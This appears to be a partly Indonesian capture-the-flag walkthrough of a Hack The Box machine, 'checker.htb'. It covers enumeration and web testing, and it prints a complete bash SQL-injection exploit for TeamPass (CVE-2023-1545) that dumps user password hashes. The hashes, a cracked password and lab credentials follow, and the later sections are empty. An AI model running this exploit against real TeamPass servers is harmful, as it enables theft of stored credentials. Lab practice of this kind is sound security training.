![](Pasted%20image%2020250223103627.png)
# 1.  Service Enumeration

| IP  | Port       |
| --- | ---------- |
| TCP | 22,80,8080 |
| UDP | -          |
## A.  TCP Active Port 
![](Pasted%20image%2020250223103808.png)
## B. UDP Active Port
No result.
## C.  Domain
![](Pasted%20image%2020250223112458.png)
add them to /etc/host
# 2. Initial Access
## A. Web
Port 80
fitur:
- Login
- Forgot Password
![](Pasted%20image%2020250223104349.png)
Port 8080 
Fitur:
- Login, ada satu form unik dengan value 60
- menggunakan **Teampass** -> coba cek versi nya
![](Pasted%20image%2020250223104646.png)
## B. Directory
ga bisa ada waf kedua web servernya
![](Pasted%20image%2020250223111956.png)
ada rate limiting
![](Pasted%20image%2020250223104841.png)
## C. checker.htb Forgot Password
reflected
![](Pasted%20image%2020250223113128.png)
cannot be exploited yet
![](Pasted%20image%2020250223122524.png)
coba test SQLi injection save it to file, and send it to sqlmap
![](Pasted%20image%2020250223212122.png)
tidak berhasil
## D. Teampass
tidak menemukan version, coba cari manual
https://security.snyk.io/vuln/SNYK-PHP-NILSTEAMPASSNETTEAMPASS-3367612
[CVE-2023-1545](https://www.cve.org/CVERecord?id=CVE-2023-1545)
![](Pasted%20image%2020250224142310.png)
```
if [ "$#" -lt 1 ]; then
  echo "Usage: $0 <base-url>"
  exit 1
fi

vulnerable_url="$1/api/index.php/authorize"

check=$(curl --silent "$vulnerable_url")
if echo "$check" | grep -q "API usage is not allowed"; then
  echo "API feature is not enabled :-("
  exit 1
fi

# htpasswd -bnBC 10 "" h4ck3d | tr -d ':\n'
arbitrary_hash='$2y$10$u5S27wYJCVbaPTRiHRsx7.iImx/WxRA8/tKvWdaWQ/iDuKlIkMbhq'

exec_sql() {
  inject="none' UNION SELECT id, '$arbitrary_hash', ($1), private_key, personal_folder, fonction_id, groupes_visibles, groupes_interdits, 'foo' FROM teampass_users WHERE login='admin"
  data="{\"login\":\""$inject\"",\"password\":\"h4ck3d\", \"apikey\": \"foo\"}"
  token=$(curl --silent --header "Content-Type: application/json" -X POST --data "$data" "$vulnerable_url" | jq -r '.token')
  echo $(echo $token| cut -d"." -f2 | base64 -d 2>/dev/null | jq -r '.public_key')
}

users=$(exec_sql "SELECT COUNT(*) FROM teampass_users WHERE pw != ''")

echo "There are $users users in the system:"

for i in `seq 0 $(($users-1))`; do
  username=$(exec_sql "SELECT login FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT $i,1")
  password=$(exec_sql "SELECT pw FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT $i,1")
  echo "$username: $password"
done
```

dapat credential
![](Pasted%20image%2020250224144238.png)
```
admin: $2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya
bob: $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy
```

berhasil crack -> cheerleader
![](Pasted%20image%2020250224150057.png)
![](Pasted%20image%2020250224150212.png)
## E. Credential on teampass
bob@checker.htb mYSeCr3T_w1kI_P4sSw0rD
![](Pasted%20image%2020250224153732.png)
bisa login![](Pasted%20image%2020250224194525.png)
reader hiccup-publicly-genesis
![](Pasted%20image%2020250224153936.png)
tidak bisa login
![](Pasted%20image%2020250224154041.png)
## Analisa Checker.htb
1. Search
   try input ' -> input validasi, no error
2. Shelves
   - create shelves -> no html injection
   - upload cover -> invalid fil
   -  tag -> no xss
3. Books
   - create shelves -> no html injection
   - upload cover -> invalid fil
   -  tag -> no xss
ada OTP setup, coba pake menggunakan google authenticator
![](Pasted%20image%2020250224211926.png)
Coba ganti vpn ke US (Tips dari Forum)
masukkan kode otp dari situs ini
![](Pasted%20image%2020250225093354.png)
Berhasil
![](Pasted%20image%2020250225093436.png)
ternyata Bookstack ada versinya juga hmmmmm






# 3. Privilege Escalation
## a. 

# 4. Post Exploitation
## a. User Flag
## b. Root Flag
